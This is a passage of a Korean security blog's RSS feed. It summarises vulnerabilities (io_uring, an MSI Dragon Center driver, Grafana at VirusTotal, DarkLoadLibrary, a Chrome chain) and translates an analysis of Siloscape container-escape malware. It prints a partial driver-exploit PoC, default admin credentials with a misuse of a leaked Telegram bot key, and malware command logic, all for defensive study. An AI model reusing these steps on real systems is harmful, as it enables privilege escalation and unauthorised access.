      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://flattsecurity.medium.com/cve-2021-20226-a-referen</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://flattsecurity.medium.com/cve-2021-20226-a-reference-counting-bug-which-leads-to-local-privilege-escalation-in-io-uring-e946bd69177a">CVE-2021–20226 a reference counting bug which leads to local privilege escalation in io_uring.</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>io_uring in Linux kernel 5.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Linux kernel 비동기 I/O 메커니즘인 io_uring에서 발생하는 Use-after-free 취약점에 대한 새로운 write-up이 공개되었습니다. File structure를 worker 스레드가 사용할 메모리로 옮기는 과정에서 reference 카운터를 늘리지 않고 file descriptor table을 공유하면 취약점이 발생합니다. </p><p>Worker 스레드는 file_struct 구조체에 대한 reference를 찾기 위해 함수 <code>fdget()</code>를 사용합니다. 하지만 <code>fdget()</code>는 file_struct에 대한 reference counter가 1일 때 이를 증가시키지 않으므로 <code>fdget()</code>에 의해 얻은 파일은 이미 닫히고 해제되어 있을 수도 있습니다.</p><p>이미 닫히고 해제된 파일에 접근해 작업한다는 것은 Use-after-free 취약점으로 해커는 이를 악용해 로컬 시스템에 서비스 거부 공격을 할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/23/fabu1ous/2021-06-23/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-29337: MSI Dragon Center의 로컬 권한 상승 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/22/l0ch/2021-06-22/</link>
      <guid>https://hackyboiz.github.io/2021/06/22/l0ch/2021-06-22/</guid>
      <pubDate>Tue, 22 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/rjt-gupta/CVE-2021-29337&quot;&gt;CVE-2021-293</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/rjt-gupta/CVE-2021-29337">CVE-2021-29337 - Privilege Escalation in MODAPI.sys (MSI Dragon Center)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MSI Dragon Center 2.0.104.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>LED 시스템, 시스템 환경 설정, 모바일 앱 원격 제어 등의 기능을 지원하는 MSI의 시스템 모니터링 유틸리티인 Dragon Center에서 발견된 로컬 권한 상승 취약점의 PoC가 공개되었습니다.</p><p>취약점은 Dragon Center의 커널 드라이버 <code>MODAPI.sys</code>에 존재하며 PoC의 일부 코드는 다음과 같습니다.</p><pre><code class="hljs c"><span class="hljs-comment">//Allocate Input Buffer</span>LPVOID lpInMemoryArea = VirtualAlloc((LPVOID)<span class="hljs-number">0x41000000</span>, <span class="hljs-number">0x100</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);LPVOID lpOutMemoryArea = VirtualAlloc((LPVOID)<span class="hljs-number">0x42000000</span>, <span class="hljs-number">0x100</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<span class="hljs-comment">//Set Input Buffer</span>DWORD pPhysicalMemAddr = <span class="hljs-number">0xE0000</span>;DWORD dwDataSizeToRead = <span class="hljs-number">0x4</span>;DWORD dwAmountOfDataToRead = <span class="hljs-number">8</span>;memmove(lpInMemoryArea, &amp;pPhysicalMemAddr, <span class="hljs-keyword">sizeof</span>(DWORD));memmove((BYTE*)lpInMemoryArea + <span class="hljs-number">0x8</span>, &amp;dwDataSizeToRead, <span class="hljs-keyword">sizeof</span>(DWORD));memmove((BYTE*)lpInMemoryArea + <span class="hljs-number">0xC</span>, &amp;dwAmountOfDataToRead, <span class="hljs-keyword">sizeof</span>(DWORD));<span class="hljs-comment">// Send IOCTL</span>DWORD dwLastError = DeviceIoControl(hDriver, <span class="hljs-number">0x9C406104</span>, lpInMemoryArea, <span class="hljs-number">0x10</span>, lpOutMemoryArea, <span class="hljs-number">0x40</span>, &amp;dwBytesOut, <span class="hljs-literal">NULL</span>);</code></pre><p><code>MODAPI.sys</code>의 METHOD_BUFFERED IOCTL <code>0x9C406104</code> 는 물리 메모리를 가상 주소 공간에 매핑하는 <code>MmMapIoSpace</code> 루틴을 호출합니다. 이를 악용해 해커가 Input Buffer인 <code>lpInMemoryArea</code> 에 권한 상승을 위한 임의의 값을 설정한 뒤 <code>DeviceIoControl</code>을 통해 IOCTL 요청을 보내면 Windows의 커널 메모리를 유저모드의 데이터로 임의로 조작 할 수 있으며 이는 로컬 권한 상승으로 이어질 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/msi/">msi</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/local-privilege-escalation/">local privilege escalation</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel-driver/">kernel driver</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/22/l0ch/2021-06-22/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] VirusTotal Grafana Admin Panel bypass</title>
      <link>https://hackyboiz.github.io/2021/06/21/idioth/2021-06-21/</link>
      <guid>https://hackyboiz.github.io/2021/06/21/idioth/2021-06-21/</guid>
      <pubDate>Mon, 21 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://infosecwriteups.com/grafana-admin-panel-bypass-in</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://infosecwriteups.com/grafana-admin-panel-bypass-in-google-acquisition-virustotal-c5ecc9d7b8ae">Grafana Admin Panel bypass in Google Acquisition(VirusTotal)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>grafana.internal.virustotal.com</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>구글이 인수한 VirusTotal의 서브 도메인 grafana.internal.virustotal.com에서 Admin Panel을 우회할 수 있는 취약점이 발견되었습니다. Grafana는 다중 플랫폼 오픈 소스 분석 및 모니터링 솔루션으로, 해당 도메인은 권한이 없으면 grafana 엔드포인트에 접속하거나 새로운 계정 생성이 불가능합니다. (Google, Github 등 다른 계정 이용 포함)</p><p>Grafana에는 사용자를 수정, 추가하고 비밀번호를 수정할 수 있는 엔드포인트가 존재하지만 일부 기능은 관리자만이 사용할 수 있습니다. Grafana에서 대부분의 민감한 request의 기본 인증 헤더는 <code>Authorization: Basic YWRtaW46YWRtaW4=</code>인데 base64로 decode하면 <code>admin:admin</code>이 나옵니다. 이를 사용해 관리자로 로그인한 후 관리자 권한을 가진 새 계정을 생성하여 애플리케이션 전체에 액세스할 수 있습니다.</p><p>또한 Admin Panel에서 VirusTotal 내부 텔레그램 그룹에 알림을 보내는 텔레그램 API 키가 존재합니다. 이를 통해 봇을 사용하여 텔레그램 그룹의 모든 사람에게 메시지를 전송할 수 있습니다.</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>api.telegram.org<span class="hljs-regexp">/bot_API_KEY/</span>sendMessage?chat_id=userid&amp;text= SOME_URL_ENCODED_TEXT</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/google/">google</category>
      
      <category domain="https://hackyboiz.github.io/tags/grafana/">grafana</category>
      
      <category domain="https://hackyboiz.github.io/tags/virustotal/">virustotal</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/21/idioth/2021-06-21/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Translation] Siloscape: First Known Malware Targeting Windows Containers to Compromise Cloud Environments</title>
      <link>https://hackyboiz.github.io/2021/06/20/idioth/siloscape/</link>
      <guid>https://hackyboiz.github.io/2021/06/20/idioth/siloscape/</guid>
      <pubDate>Sun, 20 Jun 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;안녕하세요. idioth입니다. 원래 오늘은 ghidra의 다음 파트가 나오는 날이죠. 하지만 여러 가지 사정으로 인해 번역글을 작성하게 되었어요.&lt;/p&gt;
&lt;p&gt;아직 저는 기말 시험이 끝나지 않았고 또 사무실에 있는 노트북에 분석한 VM이 잠들어</description>
        
      
      
      
      <content:encoded><![CDATA[<p>안녕하세요. idioth입니다. 원래 오늘은 ghidra의 다음 파트가 나오는 날이죠. 하지만 여러 가지 사정으로 인해 번역글을 작성하게 되었어요.</p><p>아직 저는 기말 시험이 끝나지 않았고 또 사무실에 있는 노트북에 분석한 VM이 잠들어 있는데 어제 발에 레이저 치료를 받은 탓에 잘 걷지 못하고 있답니다 하하하. 생각보다 발 뒤꿈치로 걷는 거 할만해요 ^^….</p><p>아무튼 이런저런 이유로 기말 준비 중인 저에게 싸장님께서 읽으라고 추천해주신 글을 읽을 겸 번역해왔습니다! 후반부에 뺀 부분이 조금 있습니다! Siloscape의 행위를 보고 싶어서 IRC 접속 부분은 제외하고 번역을 했습니다. :)</p><blockquote><p>원문 글 : <a href="https://unit42.paloaltonetworks.com/siloscape/">Siloscape: First Known Malware Targeting Windows Containers to Compromise Cloud Environments</a></p></blockquote><h1 id="Executive-Summary"><a href="#Executive-Summary" class="headerlink" title="Executive Summary"></a>Executive Summary</h1><p>2021년 3월에 Windows container를 타깃으로 하는 최초의 악성코드를 발견했다. 지난 몇 년간 클라우드를 타깃으로 한 악성코드가 증가한 것을 생각하면 놀랍지는 않다. 이 악성코드는 container escape가 주목적이고 주로 server silo를 통해 Windows에서 구현되므로 Siloscape (silo escape처럼 들림 ㅎ)라고 이름 지었다.</p><p>Siloscape는 Windows container를 통해 Kubernetes clusters를 타깃으로 하는 악성코드이다. 주목적은 악성 컨테이너를 실행하기 위해 취약한 Kubernetes clusters에 백도어를 설치하는 것이다.</p><p>각 컨테이너는 하나의 클라우드 애플리케이션을 실행하는 반면에 하나의 클러스터는 여러 개의 클라우드 애플리케이션을 실행할 수 있으므로 개별 컨테이너를 손상시키는 것보다 전체 클러스터를 손상시키는 것이 더 치명적이다. 예시로 해커가 사용자 이름 및 암호, 조직의 기밀 정보와 내부 파일 또는 클러스텡 호스팅 된 전체 데이터베이스와 같은 중요 정보를 훔칠 수 있다. 해커가 랜섬웨어를 통해 조직의 파일을 인질로 잡을 수도 있다. 더 심각한 것은 많은 조직들이 클라우드로 이전하면서 개발, 테스트 환경으로 Kubernetes clusters를 많이 사용하고 있다. 이러한 점에서 광범위한 소프트웨어 공급망 공격이 발생할 수도 있다.</p><p>Siloscape는 C2 (Command and Cotrol) 서버에 익명으로 연결하기 위해 토르 프록시와 <code>.onion</code> 도메인을 사용한다. 23개(명?, 기관인지 사람인지 애매하네요)의 피해자를 찾았고 총 313명의 사용자를 호스팅 하는데 서버가 사용되고 있음을 발견했다. 이는 Siloscape가 캠페인의 빙산의 일각이라는 부분을 알려준다. 필자는 또한 이 캠페인이 1년 이상 지속되어 왔음을 발견했다.</p><p>이 리포트는 Windows container 취약점의 배경 지식, Siloscape의 기술 개요, Windows container 보안 권장 사항을 제공한다.</p><h1 id="Windows-Server-Container-취약점-개요"><a href="#Windows-Server-Container-취약점-개요" class="headerlink" title="Windows Server Container 취약점 개요"></a>Windows Server Container 취약점 개요</h1><p>2020년 7월 15에 <a href="https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/">Windows container boundaries에 관한 게시글</a>과 어떻게 우회할 수 있는지 작성했다. 이 게시글에서 컨테이너를 escape 하는 기술을 제공하고 해커가 escape 할 수 있는 위험이 있는 애플리케이션에 대해 이야기했다. 가장 중요한 애플리케이션은 Kubernetes의 Windows container node를 탈출하여 클러스터를 확산시키는 것이었다.</p><p>마이크로소프트에서 Windows Server container는 보안 기능이 아니라는 이유로 이 이슈를 취약점으로 생각하지 않았다. 따라서 컨테이너 내부에서 실행되는 각각의 애플리케이션은 호스트에서 직접 실행되는 것처럼 처리되어야 한다.</p><p>몇 주 후, Kubernetes가 이러한 이슈에 취약하다고 구글에 전달했다. 구글은 마이크로소프트에 전달하였고 마이크로소프트는 이 이슈를 Windows container에서 호스트로 escape 하는 것으로 결정하였지만 컨테이너에서 관리자 권한 없이 실행되면 취약점으로 간주된다.</p><p>그 후에 Windows Server container를 타깃으로 한 악성코드 Siloscape를 발견하였다. Siloscape는 Hyper-V가 아닌 Server Container를 사용하는 Kubernetes을 타깃으로 하는 난독화된 악성코드이며 주목적은 설정이 미흡한 Kubernetes 클러스터에 백도어를 열어 암호 화폐 채굴과 같은 악성 container를 실행하는 것이다.</p><p>악성코드의 동작과 기술에 대한 특징은 다음과 같다:</p><ul><li>알려진 취약점 (1-day)를 사용하여 타깃 클라우드 애플리케이션에 접근</li><li>Windows container escape를 통해 컨테이너를 escape 하고 underlying node에서 코드를 실행</li><li>node의 자격 증명을 통해 클러스터에 전파를 시도</li><li>토르 네트워크를 통해 IRC 프로토콜을 사용하여 C2 서버에 접속</li><li>추가 command 대기</li><li></li></ul><p>이 악성코드는 Kubernetes cluster의 컴퓨팅 리소스를 사용하여 암호화폐 채굴을 수행하고 손상된 클러스터에서 실행되는 수백 개의 애플리케이션의 중요 데이터를 가져올 수 있다.</p><p>C2 서버를 조사한 결과 이 악성코드는 큰 네트워크의 일부분이며 이 캠페인은 1년 이상 진행됐다. 게다가 캠페인의 특정 부분이 아직 활성화되어있다.</p><h1 id="기술-개요"><a href="#기술-개요" class="headerlink" title="기술 개요"></a>기술 개요</h1><p>Siloscape의 자세한 기술을 살펴보기 전에 전반적인 행위를 살펴보자.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled.png"></p><ol><li>해커는 1-day 취약점이나 웹페이지, 데이터베이스 취약점을 사용하여 Windows container 내부에 원격 코드 실행 (Remote Code Execution, RCE)을 수행</li><li>Siloscape (<code>CloudMalware.exe</code>)를 C2 접속 정보와 함께 command line으로 실행</li><li>Siloscape는 <code>SeTcbPrivilege</code> 권한을 얻기 위해 <code>CExecSvc.exe</code>를 impersonate (<a href="https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/">해당 게시글</a>에서 기술 상세 내용 확인 가능)</li><li>호스트에 global symbolic link를 생성하고 컨테이너화 된 X 드라이브를 호스트의 C 드라이브에 연결</li><li>global link를 사용하여 호스트에서 이름으로 <code>kubectl.exe</code>를 찾고 정규식으로 Kubernetes 설정 파일을 찾음</li><li>손상된 노드가 새로운 Kubernetes deployments를 생성할 수 있는 권한이 충분한지 확인</li><li>unzip을 사용해 압축 파일에서 토르 클라이언트를 디스크로 추출 (Siloscape의 main binary에 파일이 압축되어 있음)</li><li>토르 네트워크에 연결</li><li>command line argument를 통해 C2 서버의 비밀번호를 암호화</li><li><code>.onion</code> 도메인을 사용하여 C2 서버에 연결</li><li>C2 서버에서 오는 명령을 기다리고, 명령이 올 경우 실행</li></ol><p>컨테이너를 타깃으로 한 다른 암호화폐 채굴이 주 목적인 악성코드들과 다르게 Siloscape는 클러스터를 손상시키지 않는다. 대신에 탐지 및 추적을 방지하고 클러스터에 백도어를 설치하는 데에 집중했다.</p><h1 id="Defense-우회와-난독화"><a href="#Defense-우회와-난독화" class="headerlink" title="Defense 우회와 난독화"></a>Defense 우회와 난독화</h1><p>Siloscape는 심하게 난독화되어 있으며 대부분의 문자열을 읽을 수 없다. 난독화 로직은 어렵지 않지만 리버싱 하기 너무 힘들다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%201.png"></p><p>단순한 API 호출도 난독화 되어있으며 함수를 단순하게 호출하지 않고 Native API (NTAPI)를 사용하였다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%202.png"></p><p>예시로 <code>CreateFile</code>을 호출하는 대신에 <code>NtCreateFile</code>을 호출한다. <code>NtCreateFile</code>을 직접 호출하는 대신에 런타임에서 <code>ntdll.dll</code>에서 함수 이름을 찾아 주소로 점프하여 호출한다. 그뿐만 아니라 함수와 모듈 이름을 난독화하고 런타임에서 복호화한다. 정적 분석으로는 분석하기 어렵고 리버스 엔지니어링 하는데 힘든 악성코드이다.</p><p>Siloscape는 한 쌍의 key를 사용하여 C2 서버의 비밀번호를 복호화한다. 난독화 중에서 가장 중요한 특징은 키 하나는 바이너리에 하드 코딩되어 있는데, 하나는 command line argument에서 제공된다는 점이다. AutoFocus와 VirusTotal 같은 여러 엔진에서 hash를 검색해도 결과를 찾을 수 없었다. 이를 통해 Siloscape는 새로운 공격을 할 때 고유한 키를 사용해서 컴파일을 하는 것을 유추할 수 있다. 하드 코딩된 키는 바이너리들을 살짝씩 다르게 만들어서 hash를 통해 찾을 수 없음을 설명한다. 또 hash만으로 Siloscape를 탐지할 수 없다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%203.png"></p><p>다른 흥미로운 특징은 Visual Studio의 Resource Manager를 사용한 것이다. Visual Studio에 내장된 기능으로 어떤 파일이든 원본 바이너리에 추가할 수 있고 간단한 API 호출을 통해 포인터를 얻을 수 있다. Siloscape는 디스크에 토르 아카이브와 아카이브를 열기 위해 사용되는 unzip 바이너리를 이를 통해 추가했다. 또한 토르를 통해 C2 서버에 안전하게 접속한다.</p><h1 id="The-Container-Escape"><a href="#The-Container-Escape" class="headerlink" title="The Container Escape"></a>The Container Escape</h1><p>Siloscape의 흥미로운 점 중 하나는 컨테이너를 escape 하는 것이다. escape를 하기 위해 system call <code>NtSetInformationSymbolicLink</code>를 실행하려면 <code>SeTcbPrivilege</code> 권한을 얻어야 한다. 여기에는 몇 가지 방법이 있다. 예를 들어 권한을 가진 <code>CExecSvc.exe</code>에 DLL을 inject 하고 그 context에서 <code>NtSetInformationSymbolicLink</code>를 실행할 수 있다. 하지만 Siloscape는 기술 문서나 예시가 거의 없는 Thread Impersonation을 사용하였다. 이 기술의 주요한 함수는 문서화되지 않은 system call <code>NtImpersonateThread</code>이다.</p><p>Siloscape는 main thread를 impersonating 하여 <code>CExecSvc.exe</code>의 권한을 모방하고 컨테이너를 깨기 위해 새로 생성된 symbolic link에서 <code>NtSetInformationSymbolicLink</code>를 호출한다. 구체적으로 컨테이너화 된 X 드라이브를 호스트의 C 드라이브에 연결한다.</p><h1 id="클러스터-선택"><a href="#클러스터-선택" class="headerlink" title="클러스터 선택"></a>클러스터 선택</h1><p>호스트에 link를 생성한 뒤에 Kubernetes 노드에 존재하는 <code>kubectl.exe</code>와 Kubernetes 설정 파일을 찾는다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%204.png"></p><p>이름을 통해 <code>kubectl.exe</code>를 찾고 정규식을 사용해 Kubernetes 설정 파일을 찾는다. 검색하는 함수는 검색을 안 할 폴더 이름이 포함된 벡터의 포인터를 추가적인 인수로 사용한다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%205.png"></p><p>파일 검색을 위해 <code>FindFile</code>을 호출할 때 검색 속도를 빠르게 하기 위해 <code>Program Files</code>, <code>Program Files (x86)</code>, <code>Windows</code>, <code>Users</code> 폴더를 제외한다. (해당 폴더에 파일이 존재하지 않을 가능성이 높으므로) 두 파일을 모두 찾으면 전역 변수에 경로가 저장된다. 파일이 없으면 공격을 멈추고 siloscape가 종료된다.</p><p><code>kubectl</code>을 실행하는데 필요한 걸 모두 찾은 다음 <code>%ls auth can-i create deployments --kubeconfig=%ls</code> 명령어를 통해 손상된 노드가 악성 행위를 할 수 있는 권한이 있는지 확인한다. </p><h1 id="C2-연결-및-지원-명령어"><a href="#C2-연결-및-지원-명령어" class="headerlink" title="C2 연결 및 지원 명령어"></a>C2 연결 및 지원 명령어</h1><p>손상된 노드가 새로운 deployments를 생성할 수 있으면 호스트의 C 드라이브에 토르 아카이브와 unzip 바이너리를 추출한다. 토르를 추출한 후 <code>tor.exe</code>를 새 스레드로 시작하고 토르 스레드의 output을 확인할 때까지 대기한다.</p><p>토르가 실행되면 <code>.onion</code> 도메인을 통해 IRC 서버인 C2에 연결한다.</p><p>서버는 비밀번호로 보호되고 있고 command line argument와 바이트 XOR을 통해 복호화한다. C2 서버의 복호화 로직을 간단하게 표현하면 다음과 같다.</p><pre><code class="hljs angelscript">char hardCodedXor[<span class="hljs-number">32</span>] = <span class="hljs-string">&quot;HARD_CODED_32_LONG_STRING&quot;</span>;char ircPass[<span class="hljs-number">32</span>] = &#123; <span class="hljs-number">0</span> &#125;;<span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)     ircPass[i] = hardCodedXor[i] ^ argv[<span class="hljs-number">1</span>][i];</code></pre><p>IRC 서버에 연결이 성공하면 <code>JOIN #WindowsKubernetes</code> 명령어를 사용하여 <code>WindowsKubernetes</code> IRC 채널에 들어간 후 대기한다.</p><p>Siloscape는 kubectl 지원 명령과 Windows <code>cmd</code> 명령 두 가지 유형의 명령이 있다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%206.png"></p><p>명령을 <code>admin</code> 사용자가 받으면 다음 로직을 따른다.</p><ul><li>메시지가 <code>K</code>로 시작하면 <code>%ls %s --kubeconfig=%ls</code> 명령을 실행하여 위에서 찾은 경로로 클러스터에 kubectl 명령 실행<ul><li>첫 번째 파라미터 : 전역 변수의 kubectl의 경로</li><li>두 번째 파라미터 : 첫번째 문자를 제외한 admin으로의 메시지</li><li>세 번째 파라미터 : 전역 변수의 설정 파일 경로</li></ul></li><li>메시지가 <code>C</code>로 시작하면 첫 번째 문자를 빼고 Windows cmd 명령을 실행</li></ul><h1 id="결론"><a href="#결론" class="headerlink" title="결론"></a>결론</h1><p>리소스 하이재킹이나 DoS를 목적으로 한 대부분의 클라우드 악성코드와 달리 Siloscape는 하나의 목적에만 국한되지 않고 다양한 악성 행위를 수행하기 위해 백도어를 설치한다.</p><p><a href="https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/">필자의 지난 게시글</a>에서 얘기했듯 마이크로소프트는 보안 기능으로 Windows container를 사용하지 말라고 했다. 마이크로소프트는 security boundary를 컨테이너화에 의존하지 말고 Hyper-V 컨테이너를 사용하는 걸 추천한다. Windows Server container에서 실행되는 모든 프로세스는 호스트의 관리자 권한을 가진 것으로 생각해야 하며 이번 경우에는 Kubernetes node였다. 보안이 필요한 Windows Server container에서 애플리케이션을 실행하는 경우 Hyper-V 컨테이너에서 실행하는 게 좋다.</p><p>게다가 관리자는 Kubernetes cluster를 안전하게 설정해야 한다. secured Kubernetes node의 권한은 해당 악성코드가 실행될 만큼의 충분한 권한이 없어서 Siloscape에 영향을 받지 않는다.</p><p>Siloscape는 container escape를 하지 못하면 피해를 유발하지 않는다는 점에서 컨테이너 보안의 중요성을 보여준다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/cloud/">cloud</category>
      
      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/containers/">containers</category>
      
      <category domain="https://hackyboiz.github.io/tags/kubernetes/">kubernetes</category>
      
      <category domain="https://hackyboiz.github.io/tags/siloscape/">siloscape</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/20/idioth/siloscape/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Bypassing Image Load Kernel Callbacks</title>
      <link>https://hackyboiz.github.io/2021/06/20/j0ker/2021-06-20/</link>
      <guid>https://hackyboiz.github.io/2021/06/20/j0ker/2021-06-20/</guid>
      <pubDate>Sun, 20 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.mdsec.co.uk/2021/06/bypassing-image-load-kern</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.mdsec.co.uk/2021/06/bypassing-image-load-kernel-callbacks/">Bypassing Image Load Kernel Callbacks</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>프로그램에서 LoadLibrary 함수를 통해 DLL 파일을 로드하면 커널에서 등록한 Callback 함수에 의해 이벤트 로그에 해당 DLL이 로드되었다는 내용가 기록됩니다. LoadLibrary 함수를 분석해보면, 해당 이벤트는 내부 구조체들이 링크되는 과정이나 코드가 실행될 때 발생하는 것이 아니라 메모리에 할당하고 이를 셋업하는 과정에서 NtMapViewOfSection 함수에 의해 발생하는 것을 알 수 있습니다. 실제 LoadLibrary 함수를 똑같이 구현하되 NtMapViewOfSection 함수까지의 과정만 구현하고 실행할 경우, DLL이 로드되었다는 이벤트만 발생할 뿐, 실제로 DLL이 로드되지는 않습니다.</p><p>Dylan은 커널의 Callback 함수 호출을 우회하여 이벤트 로그의 발생 없이 DLL을 로드하는 방법과 이를 구현한 <a href="https://github.com/bats3c/DarkLoadLibrary">DarkLoadLibrary 소스코드</a>를 공개했습니다. 동작 과정은 아래와 같습니다.</p><ol><li>정상적인 PE 포맷을 가지고 있는지 확인</li><li>헤더와 섹션 데이터를 메모리에 복사 후 메모리 권한 설정</li><li>(필요하다면) 이미지 베이스 조정</li><li>import table과 delayed import table 세팅</li><li>TLS callback 실행</li><li>exception handler 등록</li><li>DllMain(Entry Point) 호출</li></ol><p>Dylan은 이 기법을 통해 악성코드가 어떤 DLL을 로드했는지에 대한 로그를 숨길 수 있고 이 기법이 Reflective DLL Injection을 대체할 것으로 예상하고 있다고 밝혔습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/loadimage/">loadimage</category>
      
      <category domain="https://hackyboiz.github.io/tags/event/">event</category>
      
      <category domain="https://hackyboiz.github.io/tags/darkloadlibrary/">darkloadlibrary</category>
      
      <category domain="https://hackyboiz.github.io/tags/callback/">callback</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/20/j0ker/2021-06-20/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] PuzzleMaker: 실제 공격에 사용된 Exploit chain</title>
      <link>https://hackyboiz.github.io/2021/06/19/fabu1ous/2021-06-19/</link>
      <guid>https://hackyboiz.github.io/2021/06/19/fabu1ous/2021-06-19/</guid>
      <pubDate>Sat, 19 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securelist.com/puzzlemaker-chrome-zero-day-exploi</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/">PuzzleMaker attacks with Chrome zero-day exploit chain</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google Chrome &lt;= 90.0.4430.85</p><p>Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>최근 여러 기업에 대한 고도로 표적화된 공격이 감지되었습니다. Kaspersky technologies의 분석에 따르면 해당 공격들은 구글 Chrome(CVE-2021-21224)과 Windows(CVE-2021-31955, CVE-2021-31956) 제로데이 Exploit chain을 사용합니다.</p><ul><li><p>CVE-2021-21224</p><p>90.0.4430.85이전 Chrome의 V8에는 Type confusion 취약점이 존재해 해커로 하여금 악성 HTML 페이지를 통해 원격으로 임의 코드 실행을 할 